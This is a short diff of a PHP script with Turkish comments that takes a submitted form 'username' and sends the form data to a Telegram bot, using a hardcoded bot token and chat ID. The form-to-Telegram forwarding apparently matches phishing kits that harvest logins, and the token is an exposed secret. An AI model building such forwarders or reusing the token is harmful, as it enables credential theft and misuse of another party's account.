@@ -1,7 +1,7 @@
 <?php
 // Telegram bot bilgileri
-$botToken = "7807117458:AAGibS-QJtVky7jCjLIWMJS3VcbsizsbIMk"; // BotFather'dan alınan token
-$chatId = "7807117458"; // Hedef chat ID
+$botToken = "7807117458:AAGibS-QJtVky7jCjLIWMJS3VcbsizsbIMk"; // Bot tokeninizi buraya yazın
+$chatId = "7807117458"; // Chat ID'nizi buraya yazın
 
 // Formdan gelen verileri alın
 $username = htmlspecialchars($_POST['username']);
@@ -29,6 +29,7 @@ $options = [
 $context  = stream_context_create($options);
 $response = file_get_contents($url, false, $context);
 
+// Yanıtı kontrol et
 if ($response === FALSE) {
     die('Mesaj gönderilemedi.');
 }
